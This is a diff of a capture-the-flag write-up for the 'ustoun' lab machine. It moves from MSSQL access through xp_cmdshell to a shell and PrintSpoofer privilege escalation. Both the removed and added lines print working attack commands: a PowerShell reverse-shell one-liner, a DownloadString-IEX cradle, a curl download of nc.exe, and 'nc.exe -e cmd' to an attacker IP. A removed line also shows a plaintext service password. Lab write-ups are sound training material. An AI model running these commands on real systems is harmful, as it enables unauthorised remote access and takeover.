@@ -202,7 +202,7 @@ SMB         10.10.138.186   445    DC               [+] ustoun.local\SVC-Kerb:s*
 
 ```#!/bin/sh
 ┌──(alienum㉿kali)-[~]
-└─$ python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py ustoun.local/svc-kerb:superman@10.10.197.105
+└─$ python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py ustoun.local/svc-kerb:s******n@10.10.83.216
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
 [*] Encryption required, switching to TLS
@@ -222,30 +222,44 @@ output
 dc01\svc-kerb
 ```
 
-## Uploading the reverse shell
+## Uploading the nc.exe
 
-- Create the `shell.ps1` with the below contents
+- Create dir named `tmp` under the `C:\`
 
-```powershell
-$client = New-Object System.Net.Sockets.TCPClient("10.8.28.219",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```sql
+EXEC xp_cmdshell 'mkdir C:\tmp'
 ```
 
-## Python Server
+- Curl the `nc.exe` from our vm
+
+```SQL
+EXEC xp_cmdshell 'powershell -c curl http://10.8.28.219/nc.exe -o C:\tmp\nc.exe'
+```
+
+- Listener
 
 ```sh
-sudo  python3 -m http.server 80
+┌──(alienum㉿kali)-[~]
+└─$ locate nc.exe     
+/usr/share/wordlists/SecLists/Web-Shells/FuzzDB/nc.exe
+
+┌──(alienum㉿kali)-[~]
+└─$ cd /usr/share/wordlists/SecLists/Web-Shells/FuzzDB/
+
+┌──(alienum㉿kali)-[/usr/…/wordlists/SecLists/Web-Shells/FuzzDB]
+└─$ sudo python3 -m http.server 80
+[sudo] password for alienum:
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.83.216 - - [15/Apr/2021 23:01:53] "GET /nc.exe HTTP/1.1" 200 -
 ```
 
-## Listener
+- Execute the `nc.exe`
 
-```sh
-sudo nc -lvnp 443
+```SQL
+EXEC xp_cmdshell 'C:\tmp\nc.exe -e cmd 10.8.28.219 4444'
 ```
 
-## mssqlclient | Download
-```sh
-xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.8.28.219/shell.ps1\");""
-```
+![image](/assets/img/ustoun/1.PNG)
 
 ## Privilege Escalation
 
@@ -281,10 +295,16 @@ Download the exe here [PrintSpoofer.exe](https://github.com/dievus/printspoofer)
 
 ## Download the printspoofer
 ```sh
-curl http://10.8.28.219:81/PrintSpoofer.exe -o C:\temp\printspoofer.exe
+powershell -c curl http://10.8.28.219:81/PrintSpoofer.exe -o C:\tmp\printspoofer.exe
 ```
+
+![image](/assets/img/ustoun/2.PNG)
 
 ## Run the script
 ```sh
 printspoofer.exe -i -c powershell
 ```
+
+## Rooted
+
+![image](/assets/img/ustoun/3.PNG)
